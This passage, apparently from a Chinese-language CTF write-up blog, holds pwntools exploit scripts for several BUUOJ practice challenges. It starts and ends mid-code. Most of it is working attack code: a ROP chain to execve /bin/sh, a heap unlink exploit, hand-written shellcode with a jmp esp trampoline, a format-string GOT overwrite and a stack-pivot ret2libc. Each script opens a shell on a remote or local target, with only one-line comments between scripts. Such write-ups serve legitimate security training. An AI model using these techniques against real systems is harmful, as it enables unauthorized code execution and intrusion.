class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26587</span>)</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">io.sendline(p)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><p>lambda函数我用不来。。。</p><p>buu的超时一如既往，没找到libc，算了，反正本地链接的可以打通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>:p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28871</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">libc=ELF()</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;length of item name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;the name of item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;index of item&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;length of item name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;name of the item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#add(0x40,b&#x27;aaaaaa&#x27;)</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccccc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;dddddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020c8</span></span><br><span class="line">fd=ptr-<span class="number">0x18</span></span><br><span class="line">bk=ptr-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">fake=p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(fd)+p64(bk)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(fake),fake)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">rl(<span class="string">b&#x27;0 : &#x27;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;leak&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base=leak-<span class="number">0x3c38e0</span></span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&#x27;system&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment">#shell=libc_base+0xef9f4#0x4525a 0xef9f4 0xf0897</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x80</span>)+p64(elf.got[<span class="string">&quot;atoi&quot;</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="x-ctf-b0verfl0w"><a href="#x-ctf-b0verfl0w" class="headerlink" title="x_ctf_b0verfl0w"></a>x_ctf_b0verfl0w</h2><p>给了jmp esp,剩下的自己写就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,27849)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">shellcode=asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx </span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x24</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jmp=asm(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    sub esp,0x28</span></span><br><span class="line"><span class="string">    jmp esp</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">hint=<span class="number">0x080484fd</span></span><br><span class="line">payload=shellcode+p32(<span class="number">0x08048504</span>)+jmp</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="suctf-2018-basic-pwn"><a href="#suctf-2018-basic-pwn" class="headerlink" title="suctf_2018_basic pwn"></a>suctf_2018_basic pwn</h2><p>后门送脸，好耶好耶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29685</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">280</span>+p64(<span class="number">0x401157</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><p>改个got表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25336</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system=<span class="number">0x8048400</span></span><br><span class="line">printf=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=(fmtstr_payload(<span class="number">7</span>, &#123;printf:system&#125;))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><p>栈迁移加上ret2libc，注意栈的位置，后一个溢出的地址要改变，调试得出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28861</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x0000000000400709</span></span><br><span class="line">pop_rdi=<span class="number">0x400ad3</span></span><br><span class="line">leave_ret=<span class="number">0x400a18</span></span><br><span class="line">main=<span class="number">0x4008f6</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Welcome to ACTF&#x27;s babystack!&quot;</span>,<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak=<span class="built_in">int</span>((p.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&#x27;leak&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret)+p64(main)</span><br><span class="line">payload1=payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(leak-<span class="number">8</span>)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Byebye~\x0a&#x27;</span>)</span><br><span class="line">leak2=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&#x27;puts&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak2)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=leak2-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&#x27;libc&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line">bin_sh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;How many bytes of your message?&quot;</span>,<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&#x27;leak&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#0xebc81 0xebc85 0xebc88 0xebce2 0xebd38 0xebd3f 0xebd43</span></span><br><span class="line">payload=p64(pop_rdi)+p64(bin_sh_addr)+p64(ret)*<span class="number">2</span>+p64(system_addr)</span><br><span class="line"><span class="comment"># payload=p64(libc_base+0xebce2)</span></span><br><span class="line">payload1=payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(leak-<span class="number">8</span>-<span class="number">0xB0</span>)+p64(leave_ret)</span><br><span class="line"><span class="comment">#0xb0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;What is the content of your message?&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-leak-me"><a href="#picoctf-2018-leak-me" class="headerlink" title="picoctf_2018_leak_me"></a>picoctf_2018_leak_me</h2><p>直接输入256个字符，密码直接出来了，输入就好了，不会变</p><h2 id="wustctf2020-easyfast"><a href="#wustctf2020-easyfast" class="headerlink" title="wustctf2020_easyfast"></a>wustctf2020_easyfast</h2><p>后门都给出来了，直接改0x602090的值为0即可，注意不是数字0,是\x00</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   